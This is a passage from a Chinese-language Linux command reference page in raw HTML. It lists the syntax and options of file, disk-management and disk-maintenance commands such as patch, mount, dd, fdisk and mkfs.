class="hljs-comment">被忽略，为了向后兼容</span><br><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">regexp REGEXP</span> <span class="hljs-literal">--</span> <span class="hljs-comment">使用基本正则表达式</span><br><span class="hljs-literal">--</span><span class="hljs-comment">regex</span> <span class="hljs-literal">--</span> <span class="hljs-comment">使用扩展正则表达式</span><br><span class="hljs-literal">-</span><span class="hljs-comment">q</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">quiet</span> <span class="hljs-literal">--</span> <span class="hljs-comment">安静模式，不会显示任何错误讯息</span><br><span class="hljs-literal">-</span><span class="hljs-comment">s</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">stdio</span> <span class="hljs-literal">--</span> <span class="hljs-comment">被忽略，为了向后兼容</span><br><span class="hljs-literal">-</span><span class="hljs-comment">o</span> <span class="hljs-literal">--</span> <span class="hljs-comment">指定资料库存的名称。</span><br><span class="hljs-literal">-</span><span class="hljs-comment">h</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">help</span> <span class="hljs-literal">--</span> <span class="hljs-comment">显示帮助</span><br><span class="hljs-literal">-</span><span class="hljs-comment">i</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">ignore</span><span class="hljs-literal">-</span><span class="hljs-comment">case</span> <span class="hljs-literal">--</span> <span class="hljs-comment">忽略大小写</span><br><span class="hljs-literal">-</span><span class="hljs-comment">V</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">version</span> <span class="hljs-literal">--</span> <span class="hljs-comment">显示版本信息</span> <br></code></pre></td></tr></table></figure><h4 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h4><p>Linux patch命令用于修补文件。<br>patch指令让用户利用设置修补文件的方式，修改，更新原始文件。倘若一次仅修改一个文件，可直接在指令列中下达指令依序执行。如果配合修补文件的方式则能一次修补大批文件，这也是Linux系统核心的升级方法之一。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">patch <span class="hljs-selector-attr">[-bceEflnNRstTuvZ]</span><span class="hljs-selector-attr">[-B &lt;备份字首字符串&gt;]</span><span class="hljs-selector-attr">[-d &lt;工作目录&gt;]</span><span class="hljs-selector-attr">[-D &lt;标示符号&gt;]</span><span class="hljs-selector-attr">[-F &lt;监别列数&gt;]</span><span class="hljs-selector-attr">[-g &lt;控制数值&gt;]</span><span class="hljs-selector-attr">[-i &lt;修补文件&gt;]</span><span class="hljs-selector-attr">[-o &lt;输出文件&gt;]</span><span class="hljs-selector-attr">[-p &lt;剥离层级&gt;]</span><span class="hljs-selector-attr">[-r &lt;拒绝文件&gt;]</span><span class="hljs-selector-attr">[-V &lt;备份方式&gt;]</span><span class="hljs-selector-attr">[-Y &lt;备份字首字符串&gt;]</span><span class="hljs-selector-attr">[-z &lt;备份字尾字符串&gt;]</span><span class="hljs-selector-attr">[--backup-if -mismatch]</span><span class="hljs-selector-attr">[--binary]</span><span class="hljs-selector-attr">[--help]</span><span class="hljs-selector-attr">[--nobackup-if-mismatch]</span><span class="hljs-selector-attr">[--verbose]</span><span class="hljs-selector-attr">[原始文件 &lt;修补文件&gt;]</span> 或 path <span class="hljs-selector-attr">[-p &lt;剥离层级&gt;]</span> &lt; <span class="hljs-selector-attr">[修补文件]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-b或–backup 　备份每一个原始文件。<br>-B&lt;备份字首字符串&gt;或–prefix&#x3D;&lt;备份字首字符串&gt; 　设置文件备份时，附加在文件名称前面的字首字符串，该字符串可以是路径名称。<br>-c或–context 　把修补数据解译成关联性的差异。<br>-d&lt;工作目录&gt;或–directory&#x3D;&lt;工作目录&gt; 　设置工作目录。<br>-D&lt;标示符号&gt;或–ifdef&#x3D;&lt;标示符号&gt; 　用指定的符号把改变的地方标示出来。<br>-e或–ed 　把修补数据解译成ed指令可用的叙述文件。<br>-E或–remove-empty-files 　若修补过后输出的文件其内容是一片空白，则移除该文件。<br>-f或–force 　此参数的效果和指定”-t”参数类似，但会假设修补数据的版本为新　版本。<br>-F&lt;监别列数&gt;或–fuzz&lt;监别列数&gt; 　设置监别列数的最大值。<br>-g&lt;控制数值&gt;或–get&#x3D;&lt;控制数值&gt; 　设置以RSC或SCCS控制修补作业。<br>-i&lt;修补文件&gt;或–input&#x3D;&lt;修补文件&gt; 　读取指定的修补文件。<br>-l或–ignore-whitespace 　忽略修补数据与输入数据的跳格，空格字符。<br>-n或–normal 　把修补数据解译成一般性的差异。<br>-N或–forward 　忽略修补的数据较原始文件的版本更旧，或该版本的修补数据已使　用过。<br>-o&lt;输出文件&gt;或–output&#x3D;&lt;输出文件&gt; 　设置输出文件的名称，修补过的文件会以该名称存放。<br>-p&lt;剥离层级&gt;或–strip&#x3D;&lt;剥离层级&gt; 　设置欲剥离几层路径名称。<br>-f&lt;拒绝文件&gt;或–reject-file&#x3D;&lt;拒绝文件&gt; 　设置保存拒绝修补相关信息的文件名称，预设的文件名称为.rej。<br>-R或–reverse 　假设修补数据是由新旧文件交换位置而产生。<br>-s或–quiet或–silent 　不显示指令执行过程，除非发生错误。<br>-t或–batch 　自动略过错误，不询问任何问题。<br>-T或–set-time 　此参数的效果和指定”-Z”参数类似，但以本地时间为主。<br>-u或–unified 　把修补数据解译成一致化的差异。<br>-v或–version 　显示版本信息。<br>-V&lt;备份方式&gt;或–version-control&#x3D;&lt;备份方式&gt; 　用”-b”参数备份目标文件后，备份文件的字尾会被加上一个备份字符串，这个字符串不仅可用”-z”参数变更，当使用”-V”参数指定不同备份方式时，也会产生不同字尾的备份字符串。<br>-Y&lt;备份字首字符串&gt;或–basename-prefix&#x3D;–&lt;备份字首字符串&gt; 　设置文件备份时，附加在文件基本名称开头的字首字符串。<br>-z&lt;备份字尾字符串&gt;或–suffix&#x3D;&lt;备份字尾字符串&gt; 　此参数的效果和指定”-B”参数类似，差别在于修补作业使用的路径与文件名若为src&#x2F;linux&#x2F;fs&#x2F;super.c，加上”backup&#x2F;“字符串后，文件super.c会备份于&#x2F;src&#x2F;linux&#x2F;fs&#x2F;backup目录里。<br>-Z或–set-utc 　把修补过的文件更改，存取时间设为UTC。<br>–backup-if-mismatch 　在修补数据不完全吻合，且没有刻意指定要备份文件时，才备份文件。<br>–binary 　以二进制模式读写数据，而不通过标准输出设备。<br>–help 　在线帮助。<br>–nobackup-if-mismatch 　在修补数据不完全吻合，且没有刻意指定要备份文件时，不要备份文件。<br>–verbose 　详细显示指令的执行过程。</p><h4 id="updatedb"><a href="#updatedb" class="headerlink" title="updatedb"></a>updatedb</h4><p>updatedb 命令用来创建或更新 slocate&#x2F;locate 命令所必需的数据库文件。<br>updatedb 命令的执行过程较长，因为在执行时它会遍历整个系统的目录树，并将所有的文件信息写入 slocate&#x2F;locate 数据库文件中。<br>注意：slocate 本身具有一个数据库，里面存放了系统中文件与目录的相关信息。</p><p>语法：</p><p>updatedb(选项)</p><p>参数：</p><p>-o&lt;文件&gt;：忽略默认的数据库文件，使用指定的slocate数据库文件；<br>-U&lt;目录&gt;：更新指定目录的slocate数据库；<br>-v：显示执行的详细过程。</p><h2 id="磁盘"><a href="#磁盘" class="headerlink" title="磁盘"></a>磁盘</h2><h3 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h3><h4 id="df"><a href="#df" class="headerlink" title="df"></a>df</h4><p>Linux df命令用于显示目前在Linux系统上的文件系统的磁盘使用情况统计。</p><p>语法：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">df [选项]... [<span class="hljs-symbol">FILE</span>]...<br></code></pre></td></tr></table></figure><p>参数：</p><p>文件-a, –all 包含所有的具有 0 Blocks 的文件系统<br>文件–block-size&#x3D;{SIZE} 使用 {SIZE} 大小的 Blocks<br>文件-h, –human-readable 使用人类可读的格式(预设值是不加这个选项的…)<br>文件-H, –si 很像 -h, 但是用 1000 为单位而不是用 1024<br>文件-i, –inodes 列出 inode 资讯，不列出已使用 block<br>文件-k, –kilobytes 就像是 –block-size&#x3D;1024<br>文件-l, –local 限制列出的文件结构<br>文件-m, –megabytes 就像 –block-size&#x3D;1048576<br>文件–no-sync 取得资讯前不 sync (预设值)<br>文件-P, –portability 使用 POSIX 输出格式<br>文件–sync 在取得资讯前 sync<br>文件-t, –type&#x3D;TYPE 限制列出文件系统的 TYPE<br>文件-T, –print-type 显示文件系统的形式<br>文件-x, –exclude-type&#x3D;TYPE 限制列出文件系统不要显示 TYPE</p><h4 id="du"><a href="#du" class="headerlink" title="du"></a>du</h4><p>Linux du命令用于显示目录或文件的大小。<br>du会显示指定的目录或文件所占用的磁盘空间。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">du <span class="hljs-selector-attr">[-abcDhHklmsSx]</span><span class="hljs-selector-attr">[-L &lt;符号连接&gt;]</span><span class="hljs-selector-attr">[-X &lt;文件&gt;]</span><span class="hljs-selector-attr">[--block-size]</span><span class="hljs-selector-attr">[--exclude=&lt;目录或文件&gt;]</span><span class="hljs-selector-attr">[--max-depth=&lt;目录层数&gt;]</span><span class="hljs-selector-attr">[--help]</span><span class="hljs-selector-attr">[--version]</span><span class="hljs-selector-attr">[目录或文件]</span><br></code></pre></td></tr></table></figure><h4 id="stat"><a href="#stat" class="headerlink" title="stat"></a>stat</h4><p>Linux stat命令用于显示inode内容。<br>stat以文字的格式来显示inode的内容。</p><p>语法：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">stat</span><span class="hljs-meta"> [文件或目录]</span><br></code></pre></td></tr></table></figure><h4 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h4><p>Linux pwd命令用于显示工作目录。<br>执行pwd指令可立刻得知您目前所在的工作目录的绝对路径名称。</p><h4 id="tree"><a href="#tree" class="headerlink" title="tree"></a>tree</h4><p>Linux tree命令用于以树状图列出目录的内容。<br>执行tree指令，它会列出指定目录下的所有文件，包括子目录里的文件。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">tree <span class="hljs-selector-attr">[-aACdDfFgilnNpqstux]</span><span class="hljs-selector-attr">[-I &lt;范本样式&gt;]</span><span class="hljs-selector-attr">[-P &lt;范本样式&gt;]</span><span class="hljs-selector-attr">[目录...]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-a 显示所有文件和目录。<br>-A 使用ASNI绘图字符显示树状图而非以ASCII字符组合。<br>-C 在文件和目录清单加上色彩，便于区分各种类型。<br>-d 显示目录名称而非内容。<br>-D 列出文件或目录的更改时间。<br>-f 在每个文件或目录之前，显示完整的相对路径名称。<br>-F 在执行文件，目录，Socket，符号连接，管道名称名称，各自加上”*”,”&#x2F;“,”&#x3D;”,”@”,”|”号。<br>-g 列出文件或目录的所属群组名称，没有对应的名称时，则显示群组识别码。<br>-i 不以阶梯状列出文件或目录名称。<br>-L level 限制目录显示层级。<br>-l 如遇到性质为符号连接的目录，直接列出该连接所指向的原始目录。<br>-n 不在文件和目录清单加上色彩。<br>-N 直接列出文件和目录名称，包括控制字符。<br>-p 列出权限标示。<br>-P&lt;范本样式&gt; 只显示符合范本样式的文件或目录名称。<br>-q 用”?”号取代控制字符，列出文件和目录名称。<br>-s 列出文件或目录大小。<br>-t 用文件和目录的更改时间排序。<br>-u 列出文件或目录的拥有者名称，没有对应的名称时，则显示用户识别码。<br>-x 将范围局限在现行的文件系统中，若指定目录下的某些子目录，其存放于另一个文件系统上，则将该子目录予以排除在寻找范围外。</p><h3 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h3><p>Linux mount命令是经常会使用到的命令，它用于挂载Linux系统外的文件。</p><p>语法：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs inform7">mount <span class="hljs-comment">[-hV]</span><br>mount -a <span class="hljs-comment">[-fFnrsvw]</span> <span class="hljs-comment">[-t vfstype]</span><br>mount <span class="hljs-comment">[-fnrsvw]</span> <span class="hljs-comment">[-o options <span class="hljs-comment">[,...]</span>]</span> device | dir<br>mount <span class="hljs-comment">[-fnrsvw]</span> <span class="hljs-comment">[-t vfstype]</span> <span class="hljs-comment">[-o options]</span> device dir<br></code></pre></td></tr></table></figure><p>参数：</p><p>-V：显示程序版本<br>-h：显示辅助讯息<br>-v：显示较讯息，通常和 -f 用来除错。<br>-a：将 &#x2F;etc&#x2F;fstab 中定义的所有档案系统挂上。<br>-F：这个命令通常和 -a 一起使用，它会为每一个 mount 的动作产生一个行程负责执行。在系统需要挂上大量 NFS 档案系统时可以加快挂上的动作。<br>-f：通常用在除错的用途。它会使 mount 并不执行实际挂上的动作，而是模拟整个挂上的过程。通常会和 -v 一起使用。<br>-n：一般而言，mount 在挂上后会在 &#x2F;etc&#x2F;mtab 中写入一笔资料。但在系统中没有可写入档案系统存在的情况下可以用这个选项取消这个动作。<br>-s-r：等于 -o ro<br>-w：等于 -o rw<br>-L：将含有特定标签的硬盘分割挂上。<br>-U：将档案分割序号为 的档案系统挂下。-L 和 -U 必须在&#x2F;proc&#x2F;partition 这种档案存在时才有意义。<br>-t：指定档案系统的型态，通常不必指定。mount 会自动选择正确的型态。<br>-o async：打开非同步模式，所有的档案读写动作都会用非同步模式执行。<br>-o sync：在同步模式下执行。<br>-o atime、-o noatime：当 atime 打开时，系统会在每次读取档案时更新档案的『上一次调用时间』。当我们使用 flash 档案系统时可能会选项把这个选项关闭以减少写入的次数。<br>-o auto、-o noauto：打开&#x2F;关闭自动挂上模式。<br>-o defaults:使用预设的选项 rw, suid, dev, exec, auto, nouser, and async.<br>-o dev、-o nodev-o exec、-o noexec允许执行档被执行。<br>-o suid、-o nosuid：<br>允许执行档在 root 权限下执行。<br>-o user、-o nouser：使用者可以执行 mount&#x2F;umount 的动作。<br>-o remount：将一个已经挂下的档案系统重新用不同的方式挂上。例如原先是唯读的系统，现在用可读写的模式重新挂上。<br>-o ro：用唯读模式挂上。<br>-o rw：用可读写模式挂上。<br>-o loop&#x3D;：使用 loop 模式用来将一个档案当成硬盘分割挂上系统。</p><h4 id="umount"><a href="#umount" class="headerlink" title="umount"></a>umount</h4><p>Linux umount命令用于卸除文件系统。<br>umount可卸除目前挂在Linux目录中的文件系统。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">umount <span class="hljs-selector-attr">[-ahnrvV]</span><span class="hljs-selector-attr">[-t &lt;文件系统类型&gt;]</span><span class="hljs-selector-attr">[文件系统]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-a 卸除&#x2F;etc&#x2F;mtab中记录的所有文件系统。<br>-h 显示帮助。<br>-n 卸除时不要将信息存入&#x2F;etc&#x2F;mtab文件中。<br>-r 若无法成功卸除，则尝试以只读的方式重新挂入文件系统。<br>-t&lt;文件系统类型&gt; 仅卸除选项中所指定的文件系统。<br>-v 执行时显示详细的信息。<br>-V 显示版本信息。<br>[文件系统] 除了直接指定文件系统外，也可以用设备名称或挂入点来表示文件系统。</p><h4 id="quota"><a href="#quota" class="headerlink" title="quota"></a>quota</h4><p>用于管理用户的磁盘配额。</p><h3 id="磁盘维护"><a href="#磁盘维护" class="headerlink" title="磁盘维护"></a>磁盘维护</h3><h4 id="badblocks"><a href="#badblocks" class="headerlink" title="badblocks"></a>badblocks</h4><p>Linux badblocks命令用于检查磁盘装置中损坏的区块。<br>执行指令时须指定所要检查的磁盘装置，及此装置的磁盘区块数。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">badblocks <span class="hljs-selector-attr">[-svw]</span><span class="hljs-selector-attr">[-b &lt;区块大小&gt;]</span><span class="hljs-selector-attr">[-o &lt;输出文件&gt;]</span><span class="hljs-selector-attr">[磁盘装置]</span><span class="hljs-selector-attr">[磁盘区块数]</span><span class="hljs-selector-attr">[启始区块]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-b&lt;区块大小&gt; 指定磁盘的区块大小，单位为字节。<br>-o&lt;输出文件&gt; 将检查的结果写入指定的输出文件。<br>-s 在检查时显示进度。<br>-v 执行时显示详细的信息。<br>-w 在检查时，执行写入测试。<br>[磁盘装置] 指定要检查的磁盘装置。<br>[磁盘区块数] 指定磁盘装置的区块总数。<br>[启始区块] 指定要从哪个区块开始检查。</p><h4 id="cfdisk"><a href="#cfdisk" class="headerlink" title="cfdisk"></a>cfdisk</h4><p>Linux cfdisk命令用于磁盘分区。<br>cfdisk是用来磁盘分区的程序，它十分类似DOS的fdisk，具有互动式操作界面而非传统fdisk的问答式界面，您可以轻易地利用方向键来操控分区操作。</p><p>语法：</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">cfdisk [-avz][-c <span class="hljs-attribute">&lt;柱面数目&gt;</span>-h <span class="hljs-attribute">&lt;磁头数目&gt;</span>-s <span class="hljs-attribute">&lt;盘区数目&gt;</span>][-P <span class="hljs-attribute">&lt;r,s,t&gt;</span>][外围设备代号]<br></code></pre></td></tr></table></figure><p>参数说明：</p><p>-a 在程序里不用反白代表选取，而以箭头表示。<br>-c&lt;柱面数目&gt; 忽略BIOS的数值，直接指定磁盘的柱面数目。<br>-h&lt;磁头数目&gt; 忽略BIOS的数值，直接指定磁盘的磁头数目。<br>-P&lt;r,s,t&gt; 显示分区表的内容，附加参数”r”会显示整个分区表的详细资料，附加参数”s”会依照磁区的顺序显示相关信息，附加参数”t”则会以磁头，磁区，柱面的方式来显示资料。<br>-s&lt;磁区数目&gt; 忽略BIOS的数值，直接指定磁盘的磁区数目。<br>-v 显示版本信息。<br>-z 不读取现有的分区，直接当作没有分区的新磁盘使用。</p><h4 id="dd"><a href="#dd" class="headerlink" title="dd"></a>dd</h4><p>Linux dd命令用于读取、转换并输出数据。<br>dd可从标准输入或文件中读取数据，根据指定的格式来转换数据，再输出到文件、设备或标准输出。</p><p>参数说明：</p><p>if&#x3D;文件名：输入文件名，默认为标准输入。即指定源文件。<br>of&#x3D;文件名：输出文件名，默认为标准输出。即指定目的文件。<br>ibs&#x3D;bytes：一次读入bytes个字节，即指定一个块大小为bytes个字节。<br>obs&#x3D;bytes：一次输出bytes个字节，即指定一个块大小为bytes个字节。<br>bs&#x3D;bytes：同时设置读入&#x2F;输出的块大小为bytes个字节。<br>cbs&#x3D;bytes：一次转换bytes个字节，即指定转换缓冲区大小。<br>skip&#x3D;blocks：从输入文件开头跳过blocks个块后再开始复制。<br>seek&#x3D;blocks：从输出文件开头跳过blocks个块后再开始复制。<br>count&#x3D;blocks：仅拷贝blocks个块，块大小等于ibs指定的字节数。<br>conv&#x3D;&lt;关键字&gt;，关键字可以有以下11种： </p><ul><li>conversion：用指定的参数转换文件。<br>ascii：转换ebcdic为ascii<br>ebcdic：转换ascii为ebcdic<br>ibm：转换ascii为alternate ebcdic<br>block：把每一行转换为长度为cbs，不足部分用空格填充<br>unblock：使每一行的长度都为cbs，不足部分用空格填充<br>lcase：把大写字符转换为小写字符<br>ucase：把小写字符转换为大写字符<br>swab：交换输入的每对字节<br>noerror：出错时不停止<br>notrunc：不截短输出文件<br>sync：将每个输入块填充到ibs个字节，不足部分用空（NUL）字符补齐。</li></ul><h4 id="e2fsck"><a href="#e2fsck" class="headerlink" title="e2fsck"></a>e2fsck</h4><p>Linux e2fsck命令用于检查使用 Linux ext2 档案系统的 partition 是否正常工作。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">e2fsck <span class="hljs-selector-attr">[-pacnydfvFV]</span> <span class="hljs-selector-attr">[-b superblock]</span> <span class="hljs-selector-attr">[-B blocksize]</span> <span class="hljs-selector-attr">[-l|-L bad_blocks_file]</span> <span class="hljs-selector-attr">[-C fd]</span> device<br></code></pre></td></tr></table></figure><p>参数：</p><p>device ： 预备检查的硬盘 partition，例如：&#x2F;dev&#x2F;sda1<br>-a : 对 partition 做检查，若有问题便自动修复，等同 -p 的功能<br>-b : 设定存放 superblock 的位置<br>-B : 设定单位 block 的大小<br>-c : 检查该partition 是否有坏轨<br>-C file : 将检查的结果存到 file 中以便查看<br>-d : 列印 e2fsck 的 debug 结果<br>-f : 强制检查<br>-F : 在开始检查前，将device 的 buffer cache 清空，避免有错误发生<br>-l bad_blocks_file : 将有坏轨的block资料加到 bad_blocks_file 里面<br>-L bad_blocks_file : 设定坏轨的block资料存到 bad_blocks_file 里面，若无该档则自动产生<br>-n : 将档案系统以[唯读]方式开启<br>-p : 对 partition 做检查，若有问题便自动修复<br>-v : 详细显示模式<br>-V : 显示出目前 e2fsck 的版本<br>-y : 预先设定所有检查时的问题均回答[是]</p><h4 id="hdparm"><a href="#hdparm" class="headerlink" title="hdparm"></a>hdparm</h4><p>Linux hdparm命令用于显示与设定硬盘的参数。<br>hdparm可检测，显示与设定IDE或SCSI硬盘的参数。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">hdparm <span class="hljs-selector-attr">[-CfghiIqtTvyYZ]</span><span class="hljs-selector-attr">[-a &lt;快取分区&gt;]</span><span class="hljs-selector-attr">[-A &lt;0或1&gt;]</span><span class="hljs-selector-attr">[-c &lt;I/O模式&gt;]</span><span class="hljs-selector-attr">[-d &lt;0或1&gt;]</span><span class="hljs-selector-attr">[-k &lt;0或1&gt;]</span><span class="hljs-selector-attr">[-K &lt;0或1&gt;]</span><span class="hljs-selector-attr">[-m &lt;分区数&gt;]</span><span class="hljs-selector-attr">[-n &lt;0或1&gt;]</span><span class="hljs-selector-attr">[-p &lt;PIO模式&gt;]</span><span class="hljs-selector-attr">[-P &lt;分区数&gt;]</span><span class="hljs-selector-attr">[-r &lt;0或1&gt;]</span><span class="hljs-selector-attr">[-S &lt;时间&gt;]</span><span class="hljs-selector-attr">[-u &lt;0或1&gt;]</span><span class="hljs-selector-attr">[-W &lt;0或1&gt;]</span><span class="hljs-selector-attr">[-X &lt;传输模式&gt;]</span><span class="hljs-selector-attr">[设备]</span><br></code></pre></td></tr></table></figure><p>参数说明：</p><p>-a&lt;快取分区&gt; 设定读取文件时，预先存入块区的分区数，若不加上&lt;快取分区&gt;选项，则显示目前的设定。<br>-A&lt;0或1&gt; 启动或关闭读取文件时的快取功能。<br>-c&lt;I&#x2F;O模式&gt; 设定IDE32位I&#x2F;O模式。<br>-C 检测IDE硬盘的电源管理模式。<br>-d&lt;0或1&gt; 设定磁盘的DMA模式。<br>-f 将内存缓冲区的数据写入硬盘，并清楚缓冲区。<br>-g 显示硬盘的磁轨，磁头，磁区等参数。<br>-h 显示帮助。<br>-i 显示硬盘的硬件规格信息，这些信息是在开机时由硬盘本身所提供。<br>-I 直接读取硬盘所提供的硬件规格信息。<br>-k&lt;0或1&gt; 重设硬盘时，保留-dmu参数的设定。<br>-K&lt;0或1&gt; 重设硬盘时，保留-APSWXZ参数的设定。<br>-m&lt;磁区数&gt; 设定硬盘多重分区存取的分区数。<br>-n&lt;0或1&gt; 忽略硬盘写入时所发生的错误。<br>-p&lt;PIO模式&gt; 设定硬盘的PIO模式。<br>-P&lt;磁区数&gt; 设定硬盘内部快取的分区数。<br>-q 在执行后续的参数时，不在屏幕上显示任何信息。<br>-r&lt;0或1&gt; 设定硬盘的读写模式。<br>-S&lt;时间&gt; 设定硬盘进入省电模式前的等待时间。<br>-t 评估硬盘的读取效率。<br>-T 评估硬盘快取的读取效率。<br>-u&lt;0或1&gt; 在硬盘存取时，允许其他中断要求同时执行。<br>-v 显示硬盘的相关设定。<br>-W&lt;0或1&gt; 设定硬盘的写入快取。<br>-X&lt;传输模式&gt; 设定硬盘的传输模式。<br>-y 使IDE硬盘进入省电模式。<br>-Y 使IDE硬盘进入睡眠模式。<br>-Z 关闭某些Seagate硬盘的自动省电功能。</p><h4 id="mke2fs-x3D-x3D-mkfs-ext2"><a href="#mke2fs-x3D-x3D-mkfs-ext2" class="headerlink" title="mke2fs &#x3D;&#x3D; mkfs.ext2"></a>mke2fs &#x3D;&#x3D; mkfs.ext2</h4><p>Linux mke2fs命令用于建立ext2文件系统。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mke2fs <span class="hljs-selector-attr">[-cFMqrSvV]</span><span class="hljs-selector-attr">[-b &lt;区块大小&gt;]</span><span class="hljs-selector-attr">[-f &lt;不连续区段大小&gt;]</span><span class="hljs-selector-attr">[-i &lt;字节&gt;]</span><span class="hljs-selector-attr">[-N &lt;inode数&gt;]</span><span class="hljs-selector-attr">[-l &lt;文件&gt;]</span><span class="hljs-selector-attr">[-L &lt;标签&gt;]</span><span class="hljs-selector-attr">[-m &lt;百分比值&gt;]</span><span class="hljs-selector-attr">[-R=&lt;区块数&gt;]</span><span class="hljs-selector-attr">[ 设备名称]</span><span class="hljs-selector-attr">[区块数]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-b&lt;区块大小&gt; 指定区块大小，单位为字节。<br>-c 检查是否有损坏的区块。<br>-f&lt;不连续区段大小&gt; 指定不连续区段的大小，单位为字节。<br>-F 不管指定的设备为何，强制执行mke2fs。<br>-i&lt;字节&gt; 指定”字节&#x2F;inode”的比例。<br>-N&lt;inode数&gt; 指定要建立的inode数目。<br>-l&lt;文件&gt; 从指定的文件中，读取文件西中损坏区块的信息。<br>-L&lt;标签&gt; 设置文件系统的标签名称。<br>-m&lt;百分比值&gt; 指定给管理员保留区块的比例，预设为5%。<br>-M 记录最后一次挂入的目录。<br>-q 执行时不显示任何信息。<br>-r 指定要建立的ext2文件系统版本。<br>-R&#x3D;&lt;区块数&gt; 设置磁盘阵列参数。<br>-S 仅写入superblock与group descriptors，而不更改inode able inode bitmap以及block bitmap。<br>-v 执行时显示详细信息。<br>-V 显示版本信息。</p><h4 id="mkfs"><a href="#mkfs" class="headerlink" title="mkfs"></a>mkfs</h4><p>构建一个Linux文件系统。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mkfs <span class="hljs-selector-attr">[options]</span> <span class="hljs-selector-attr">[-t type]</span> <span class="hljs-selector-attr">[fs-options]</span> device <span class="hljs-selector-attr">[size]</span><br></code></pre></td></tr></table></figure><p>可以构建的系统如下：</p><p>mkfs.bfs(8), mkfs.ext2(8), mkfs.ext3(8), mkfs.ext4(8),mkfs.minix(8), mkfs.msdos(8), mkfs.vfat(8), mkfs.xfs(8)</p><h4 id="mkswap"><a href="#mkswap" class="headerlink" title="mkswap"></a>mkswap</h4><p>Linux mkswap命令用于设置交换区(swap area)。<br>mkswap可将磁盘分区或文件设为Linux的交换区。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mkswap <span class="hljs-selector-attr">[-cf]</span><span class="hljs-selector-attr">[-v0]</span><span class="hljs-selector-attr">[-v1]</span><span class="hljs-selector-attr">[设备名称或文件]</span><span class="hljs-selector-attr">[交换区大小]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-c 建立交换区前，先检查是否有损坏的区块。<br>-f 在SPARC电脑上建立交换区时，要加上此参数。<br>-v0 建立旧式交换区，此为预设值。<br>-v1 建立新式交换区。<br>[交换区大小] 指定交换区的大小，单位为1024字节。</p><h4 id="fdisk"><a href="#fdisk" class="headerlink" title="fdisk"></a>fdisk</h4><p>Linux fdisk是一个创建和维护分区表的程序，它兼容DOS类型的分区表、BSD或者SUN类型的磁盘列表。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">fdisk <span class="hljs-selector-attr">[必要参数]</span><span class="hljs-selector-attr">[选择参数]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>必要参数：<br>-l 列出素所有分区表<br>-u 与”-l”搭配使用，显示分区数目<br>选择参数：<br>-s&lt;分区编号&gt; 指定分区<br>-v 版本信息<br>菜单操作说明</p><p>m ：显示菜单和帮助信息<br>a ：活动分区标记&#x2F;引导分区<br>d ：删除分区<br>l ：显示分区类型<br>n ：新建分区<br>p ：显示分区信息<br>q ：退出不保存<br>t ：设置分区号<br>v ：进行分区检查<br>w ：保存修改<br>x ：扩展应用，高级功能</p><h4 id="swapon"><a href="#swapon" class="headerlink" title="swapon"></a>swapon</h4><p>Linux swapon命令用于激活Linux系统中交换空间，Linux系统的内存管理必须使用交换区来建立虚拟内存。 </p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">swapon -<span class="hljs-selector-tag">a</span> <span class="hljs-selector-attr">[-v]</span>       //-<span class="hljs-selector-tag">a</span> 自动启动所有SWAP装置<br></code></pre></td></tr></table></figure><h2 id="网络和系统"><a href="#网络和系统" class="headerlink" title="网络和系统"></a>网络和系统</h2><h3 id="网络通讯"><a href="#网络通讯" class="headerlink" title="网络通讯"></a>网络通讯</h3><h4 id="telnet"><a href="#telnet" 